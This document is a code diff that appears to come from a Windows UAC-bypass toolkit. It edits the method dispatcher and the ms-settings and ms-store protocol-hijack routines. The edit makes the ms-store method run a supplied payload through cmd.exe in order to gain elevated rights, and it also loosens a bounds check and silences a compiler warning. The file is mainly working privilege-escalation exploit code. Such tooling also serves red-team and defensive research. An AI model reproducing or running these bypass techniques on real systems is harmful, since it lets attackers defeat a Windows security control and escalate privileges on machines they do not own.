@@ -274,7 +274,7 @@ NTSTATUS MethodsManagerCall(
         return STATUS_NOT_SUPPORTED;
     }
 
-    if ((Method >= UacMethodMax) || (Method < UacMethodTest))
+    if (Method >= UacMethodMax)
         return STATUS_INVALID_PARAMETER;
 
     //
@@ -286,7 +286,10 @@ NTSTATUS MethodsManagerCall(
     }
 #endif //_WIN64
 
+#pragma warning(push)
+#pragma warning(disable:33010) //BS disable.
     Entry = &ucmMethodsDispatchTable[Method];
+#pragma warning(pop)
 
     Status = IsMethodMatchRequirements(Entry);
     if (!NT_SUCCESS(Status))
@@ -545,7 +548,7 @@ UCM_API(MethodTokenModUIAccess)
 
 UCM_API(MethodShellWSReset)
 {
-    ULONG Result = 0;
+    NTSTATUS Result = STATUS_ACCESS_DENIED;
     LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
     SIZE_T Size;
 
@@ -680,23 +683,42 @@ UCM_API(MethodFwCplLua2)
 
 UCM_API(MethodProtocolHijack)
 {
-    LPWSTR lpszPayload = NULL;
+    NTSTATUS Result = STATUS_ACCESS_DENIED;
+    LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
+    SIZE_T Size;
 
     //
     // Select target application or use given by optional parameter.
     //
     if (g_ctx->OptionalParameterLength == 0)
-        lpszPayload = g_ctx->szDefaultPayload;
+        PayloadParameter = g_ctx->szDefaultPayload;
     else
-        lpszPayload = g_ctx->szOptionalParameter;
+        PayloadParameter = g_ctx->szOptionalParameter;
 
     switch (Parameter->Method) {
+    
     case UacMethodMsSettingsProtocol:
-        return ucmMsSettignsProtocolMethod(lpszPayload);
+        Result = ucmMsSettignsProtocolMethod(PayloadParameter);
+        break;
+    
     case UacMethodMsStoreProtocol:
-        return ucmMsStoreProtocolMethod(lpszPayload);
+
+        Size = ((MAX_PATH * 2) + _strlen(PayloadParameter)) * sizeof(WCHAR);
+        PayloadFinal = supHeapAlloc(Size);
+        if (PayloadFinal) {
+
+            _strcpy(PayloadFinal, g_ctx->szSystemDirectory);
+            _strcat(PayloadFinal, CMD_EXE);
+            _strcat(PayloadFinal, RUN_CMD_COMMAND);
+            _strcat(PayloadFinal, PayloadParameter);
+            Result = ucmMsStoreProtocolMethod(PayloadFinal);
+            supHeapFree(PayloadFinal);
+        }
+        break;
+
     default:
-        return STATUS_ACCESS_DENIED;
+        break;
     }
 
+    return Result;
 }
